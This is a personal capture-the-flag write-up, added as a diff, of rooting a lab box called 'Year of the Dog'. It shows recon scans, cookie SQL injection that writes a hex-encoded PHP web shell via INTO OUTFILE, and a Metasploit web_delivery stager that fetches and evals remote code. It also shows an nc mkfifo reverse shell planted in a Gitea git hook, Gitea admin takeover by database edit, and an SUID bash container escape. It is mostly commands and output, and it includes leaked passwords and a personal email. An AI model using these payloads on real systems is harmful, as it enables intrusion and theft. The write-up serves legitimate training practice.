@@ -1,0 +1,384 @@
+IP:10.10.242.121
+
+Edit /etc/hosts file.
+
+127.0.0.1       kubernetes.docker.internal
+ 10.10.242.121  dog.thm
+
+
+Canis Queueing
+
+Nmap scan results:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)
+|   256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)
+|_  256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Canis Queue
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=11/21%OT=22%CT=1%CU=32555%PV=Y%DS=2%DC=T%G=Y%TM=5FB8B6
+OS:29%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)OPS(O1=
+OS:M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7
+OS:%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y
+OS:%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD
+OS:=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%D
+OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O
+OS:=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40
+OS:%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 8080/tcp)
+HOP RTT       ADDRESS
+1   137.13 ms 10.9.0.1
+2   137.28 ms dog.thm (10.10.242.121)
+
+
+Nikto scan results:
+
+root@LAPTOP-U5913CMD:/home/akshay# nikto -h dog.thm
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.242.121
++ Target Hostname:    dog.thm
++ Target Port:        80
++ Start Time:         2020-11-21 11:37:43 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ Cookie id created without the httponly flag
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ /config.php: PHP Config file may contain database IDs and passwords.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7785 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2020-11-21 11:57:47 (GMT5.5) (1204 seconds)
+
+
+
+NO results with wfuzz subdomain enumeration
+
+root@LAPTOP-U5913CMD:/home/akshay# wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.dog.thm" --hw 54 -t 100 dog.thm
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/bing.py Exception, msg=No module named 'shodan'
+libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/shodanp.py Exception, msg=No module named 'shodan'
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://dog.thm/
+Total requests: 114532
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+
+000000690:   400        12 L     53 W     422 Ch      "gc._msdcs"
+000009543:   400        12 L     53 W     422 Ch      "#www"
+000010595:   400        12 L     53 W     422 Ch      "#mail"
+000019851:   400        12 L     53 W     422 Ch      "_domainkey"
+000042794:   400        12 L     53 W     422 Ch      "mailing._domainkey.info"
+000042786:   400        12 L     53 W     422 Ch      "mailing._domainkey.sunnynews"
+000047764:   400        12 L     53 W     422 Ch      "#smtp"
+000048784:   400        12 L     53 W     422 Ch      "hallam_dev"
+000048786:   400        12 L     53 W     422 Ch      "hallam_ad"
+000052107:   400        12 L     53 W     422 Ch      "WM_J_B__Ruffin"
+000075301:   400        12 L     53 W     422 Ch      "2609_N_www"
+000075305:   400        12 L     53 W     422 Ch      "0907_N_hn.m"
+000075323:   400        12 L     53 W     422 Ch      "0507_N_hn"
+000089060:   400        12 L     53 W     422 Ch      "faitspare_mbp.cit"
+000091205:   400        12 L     53 W     422 Ch      "sb_0601388345bc6cd8"
+000091206:   400        12 L     53 W     422 Ch      "sb_0601388345bc450b"
+000103209:   400        12 L     53 W     422 Ch      "#pop3"
+000104896:   400        12 L     53 W     422 Ch      "api_portal_dev"
+000104921:   400        12 L     53 W     422 Ch      "api_web_dev"
+000104999:   400        12 L     53 W     422 Ch      "api_webi_dev"
+000113009:   400        12 L     53 W     422 Ch      "sklep_test"
+
+Total time: 435.0693
+Processed Requests: 114532
+Filtered Requests: 114511
+
+The cookie value is injectable and is vulnerable to sqli.
+
+What we can do is try to get some information about the database.
+
+Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''c671d8d22acbd7cbf372a02a46c8de2d''' at line 1
+
+Yeah we get this. Cool lets use the following query
+
+' union select 1,2 from information_schema.tables-- -
+
+You are number 2 in the queue
+
+You can find the change in this sentence.
+
+You are number 5.7.31-0ubuntu0.18.04.1 in the queue
+
+Query used to find the version.
+
+' union select 1,@@version from information_schema.tables-- -
+
+Name of the table is queue.
+
+c671d8d22acbd7cbf372a02a46c8de2d' union select 1,column_name from information_schema.columns where table_name="queue"-- -
+
+As there is no username and password in the table,what we can do is try to upload a shell on the machine.
+
+TO see if this is working or not I found out this on one of the writeup.
+
+
+3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E
+
+When converted to ascii from hex looks like this:
+
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";?>
+
+We can upload using the following query
+
+' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E
+
+It should work now.
+
+http://10.10.51.174/shell.php?cmd=id
+
+c671d8d22acbd7cbf372a02a46c8de2d 66
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+Matching Modules
+================
+
+   #  Name                                                        Disclosure Date  Rank       Check  Description
+   -  ----                                                        ---------------  ----       -----  -----------
+   0  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
+   1  exploit/multi/script/web_delivery                           2013-07-19       manual     No     Script Web Delivery
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/script/web_delivery
+
+msf6 > use 1
+[*] Using configured payload python/meterpreter/reverse_tcp
+msf6 exploit(multi/script/web_delivery) > options
+
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Python
+
+
+msf6 exploit(multi/script/web_delivery) > set lhost tun0
+lhost => 10.9.81.62
+msf6 exploit(multi/script/web_delivery) > set target 1
+target => 1
+msf6 exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf6 exploit(multi/script/web_delivery) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.9.81.62:4444
+[*] Using URL: http://0.0.0.0:8080/NfQMSxYwAvIXuF
+msf6 exploit(multi/script/web_delivery) > [*] Local IP: http://172.31.76.95:8080/NfQMSxYwAvIXuF
+[*] Server started.
+[*] Run the following command on the target machine:
+php -d allow_url_fopen=true -r "eval(file_get_contents('http://10.9.81.62:8080/NfQMSxYwAvIXuF', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
+[*] 10.10.51.174     web_delivery - Delivering Payload (1111 bytes)
+[*] Sending stage (39282 bytes) to 10.10.51.174
+[*] Meterpreter session 1 opened (10.9.81.62:4444 -> 10.10.51.174:58868) at 2020-11-21 16:24:30 +0530
+
+
+
+msf6 exploit(multi/script/web_delivery) > sessions -t
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                      Connection
+  --  ----  ----                   -----------                      ----------
+  1         meterpreter php/linux  www-data (33) @ year-of-the-dog  10.9.81.62:4444 -> 10.10.51.174:58868 (10.10.51.174)
+msf6 exploit(multi/script/web_delivery) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > sysinfo
+Computer    : year-of-the-dog
+OS          : Linux year-of-the-dog 4.15.0-115-generic #116-Ubuntu SMP Wed Aug 26 14:04:49 UTC 2020 x86_64
+Meterpreter : php/linux
+meterpreter > shell
+Process 1451 created.
+Channel 0 created.
+python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@year-of-the-dog:/var/www/html$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@year-of-the-dog:/var/www/html$
+
+
+www-data@year-of-the-dog:/var/www/html$ cat config.php
+cat config.php
+<?php
+        $servername = "localhost";
+        $username = "web";
+        $password = "Cda3RsDJga";
+        $dbname = "webapp";
+
+        $dbh = new mysqli($servername, $username, $password, $dbname);
+        if ($dbh->connect_error){
+                die("Connection failed: ". $dbh->connect_error);
+        }
+
+
+?>
+
+
+Found these under work_analysis.
+
+
+Invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624
+
+
+www-data@year-of-the-dog:/home/dylan$ su dylan
+su dylan
+Password: Labr4d0rs4L1f3
+
+dylan@year-of-the-dog:~$ id
+id
+uid=1000(dylan) gid=1000(dylan) groups=1000(dylan)
+
+
+dylan@year-of-the-dog:~$ netstat -ano
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      off (0.00/0/0)
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/YearoftheDog# sqlite3 gitea.db
+SQLite version 3.33.0 2020-08-14 13:23:32
+Enter ".help" for usage hints.
+sqlite> select * from user;
+1|dylan|Dylan|Dylan Anderson|dylan@yearofthedog.thm|0|enabled|f2fd45caa2f5eae17cb5faa06eb57c4ad05532550fe37ae99e2245429757af09350be12abba616de4e8f0e37d223bd327261|argon2|0|0|0||0|||Rs6zSrVgx0|vkA9FTpZ72|en-US||1599331364|1599511857|1599511857|0|-1|1|1|0|0|0|1|0|8bb88c80301457422026e95699061e4a|dylan@yearofthedog.thm|1|0|0|0|1|0|0|0|0||gitea|0
+2|voker2311|Voker2311||akshaydeepakshinde@gmail.com|0|enabled|598af04516d05fddca080d98fb450b22ec9245dd262affb1c0cc9d042e905779ddd0ede60192aabef4a56a525d65044eba66|argon2|0|0|0||0|||2kjbLq91jg|IQxDyBvCLr|en-US||1605978913|1605978913|1605978913|0|-1|1|0|0|0|0|1|0|cf3215814462751736674de8e2d609c4|akshaydeepakshinde@gmail.com|0|0|0|0|0|0|0|0|0||gitea|0
+sqlite> select lower_name,is_admin from user;
+dylan|1
+voker2311|0
+sqlite> update user set is_admin=true where lower_name="voker2311";
+sqlite> select lower_name,is_admin from user;
+dylan|1
+voker2311|1
+
+Now that we have overwritten the database file we can check the website to see if we have got administrator's access.
+
+Now we have to create a test repo and then go to settings and click on git hooks.
+
+Edit the pre-receive file and paste the reverse shell.
+
+mkfifo /tmp/f; nc <THM-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+dylan@year-of-the-dog:/gitea/gitea$ cd /tmp
+dylan@year-of-the-dog:/tmp$ git clone http://localhost:3000/Dylan/Test-Repo.git
+Cloning into 'Test-Repo'...
+remote: Enumerating objects: 3, done.
+remote: Counting objects: 100% (3/3), done.
+remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
+Unpacking objects: 100% (3/3), done.
+dylan@year-of-the-dog:/tmp$ cd Test-Repo/
+dylan@year-of-the-dog:/tmp/Test-Repo$ echo "test" >> README.md
+dylan@year-of-the-dog:/tmp/Test-Repo$ git add README.md
+dylan@year-of-the-dog:/tmp/Test-Repo$ git commit -m "SHould word"
+
+dylan@year-of-the-dog:/tmp/Test-Repo$ git push
+Username for 'http://localhost:3000': voker2311
+Password for 'http://voker2311@localhost:3000':
+Counting objects: 3, done.
+Writing objects: 100% (3/3), 284 bytes | 284.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0)
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/YearoftheDog# nc -nvlp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.213.198 40227
+id
+uid=1000(git) gid=1000(git) groups=1000(git),1000(git)
+sudo -l
+User git may run the following commands on 42040a8f97fc:
+    (ALL) NOPASSWD: ALL
+sudo bash
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+
+
+As you can see we have got a directory that is common in container as well as the machine.
+
+So we can upload a bash directly to that folder .
+
+dylan@year-of-the-dog:/bin$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+172.17.0.2 - - [21/Nov/2020 17:36:59] "GET /bash HTTP/1.1" 200 -
+
+
+cd /data
+ls -la
+total 20
+drwxr-xr-x    5 root     root          4096 Sep  5 18:29 .
+drwxr-xr-x    1 root     root          4096 Sep  5 18:39 ..
+drwxr-xr-x    5 git      git           4096 Sep  5 18:41 git
+drwxr-xr-x    9 git      git           4096 Nov 21 17:15 gitea
+drwx------    2 root     root          4096 Sep  5 18:29 ssh
+wget http://172.17.0.1:8000/bash -o /data/bash
+
+We have transfered the bash to the container and then changed the permissions of bash so that it can be executable by dylan.
+
+dylan@year-of-the-dog:/bin$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+172.17.0.2 - - [21/Nov/2020 17:41:06] "GET /bash HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+
+
+wget http://172.17.0.1:8000/bash
+Connecting to 172.17.0.1:8000 (172.17.0.1:8000)
+saving to 'bash'
+bash                 100% |********************************| 1087k  0:00:00 ETA
+'bash' saved
+chmod 4755 bash
+
+
+Now we can get root access.
+
+dylan@year-of-the-dog:/gitea$ ./bash -p
+bash-4.4# whoami
+root
+bash-4.4# cd /root
